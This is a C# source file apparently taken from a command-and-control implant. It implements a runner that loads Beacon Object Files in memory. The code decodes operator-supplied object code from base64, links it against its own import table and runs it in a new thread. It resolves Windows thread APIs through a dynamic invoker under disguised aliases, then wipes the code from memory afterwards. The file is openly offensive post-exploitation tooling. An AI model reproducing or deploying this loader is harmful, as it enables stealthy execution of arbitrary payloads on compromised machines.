#define _AMD64
using Agent.Utilities;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Invoker.Dynamic;

namespace Agent
{
    class BofRunner
    {
        private readonly Coff beacon_helper;
        private Coff bof;
        public IntPtr entry_point;
        private readonly IAT iat;
        public Dictionary<string, string> parsed_args;
        private delegate uint WfsoDelegate(IntPtr hThread, int timeout);
        private delegate IntPtr CtDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddres, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate bool gecDelegate(IntPtr hThread, out int lpExitcode);
        public BofRunner(Dictionary<string,string> parsed_args)
        {
            this.parsed_args = parsed_args;

            // first we need a basic IAT to hold function pointers
            // this needs to be done here so we can share it between our two object files
            this.iat = new IAT();

            // First init our beacon helper object file 
            // This has the code for things like BeaconPrintf, BeaconOutput etc.
            // It also has a wrapper for the bof entry point (go_wrapper) that allows us to pass arguments. 
            byte[] beacon_funcs;
            string[] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();

            if (resource_names.Contains("coff.coff.beacon_funcs.x64.o"))
            {
                var ms = new MemoryStream();
                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("coff.coff.beacon_funcs.x64.o");
                resStream.CopyTo(ms);
                beacon_funcs = ms.ToArray(); //Can these be merged?
            }
            else
            {
                throw new Exception("Unable to load beacon_funcs resource");
            }

            try
            {
                this.beacon_helper = new Coff(beacon_funcs, this.iat);

            }
            catch (Exception e)
            {
                throw e;
            }

            // Serialise the arguments we want to send to our object file
            // Find our helper functions and entry wrapper (go_wrapper)
            this.entry_point = this.beacon_helper.ResolveHelpers(Misc.Base64DecodeToByteArray(parsed_args["arguments"]), false);
            
            // this needs to be called after we've finished monkeying around with the BOF's memory
            this.beacon_helper.SetPermissions();

        }

        public void LoadBof()
        {
            // create new coff
            this.bof = new Coff(Misc.Base64DecodeToByteArray(this.parsed_args["asm"]), this.iat);

            // stitch up our go_wrapper and go functions
            this.bof.StitchEntry(this.parsed_args["functionName"]);

            this.bof.SetPermissions();
        }

        public BofRunnerOutput RunBof(uint timeout)
        {
            StringBuilder debug_output = new StringBuilder();

            object[] ctParams = new object[] { IntPtr.Zero, (uint)0, this.entry_point, IntPtr.Zero, (uint)0, IntPtr.Zero };

            IntPtr hThread = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("ct"), typeof(CtDelegate), ref ctParams);
            uint thread_timeout = 0;
            if (!uint.TryParse(this.parsed_args["timeout"], out thread_timeout)){
                thread_timeout = 60;
            }


            object[] wfsoParams = new object[] { hThread, 86400 * 1000 };
            uint resp = Generic.InvokeFunc<uint>(Resolver.GetFunc("wfso"), typeof(WfsoDelegate), ref wfsoParams);

            if (resp == (uint)NativeDeclarations.WaitEventEnum.WAIT_TIMEOUT)
            {
                debug_output.AppendLine($"BOF timed out after {thread_timeout} seconds");
            }

            Console.Out.Flush();

            int ExitCode = 0;

            object[] gecParams = new object[] { hThread, ExitCode };
            bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("gect"), typeof(gecDelegate), ref gecParams);

            ExitCode = (int)gecParams[1];

            if (ExitCode < 0)
            {
                debug_output.AppendLine($"Exited with code: {ExitCode}");
            }

            // try reading from our shared buffer
            // the buffer may have moved (e.g. if realloc'd) so we need to get its latest address
            var output_addr = Marshal.ReadIntPtr(beacon_helper.global_buffer);
            
            // NB this is the size of the allocated buffer, not its contents, and we'll read all of its size - this may or may not be an issue depending on what is written
            var output_size = Marshal.ReadInt32(beacon_helper.global_buffer_size_ptr);

            List<byte> output = new List<byte>();

            byte c;
            int i = 0;
            while ((c = Marshal.ReadByte(output_addr + i)) != '\0' && i < output_size)
            {
                output.Add(c);
                i++;
            }

            // Now cleanup all memory...

            BofRunnerOutput Response = new BofRunnerOutput();

            debug_output.AppendLine(Encoding.ASCII.GetString(output.ToArray()));
            Response.Output = debug_output.ToString();
            Response.ExitCode = ExitCode;

            //Clear the bof from memory
            ClearMemory();

            return Response;

        }

        private void ClearMemory()
        {
            /* things that need cleaning up:
                - beacon_funcs BOF
                - the bof we ran
                - all of our input/output buffers
                - our IAT table
            */
            this.beacon_helper.Clear();
            this.bof.Clear();
            this.iat.Clear();

        }
    }

    class BofRunnerOutput
    {
        internal string Output;
        internal int ExitCode;
    }
}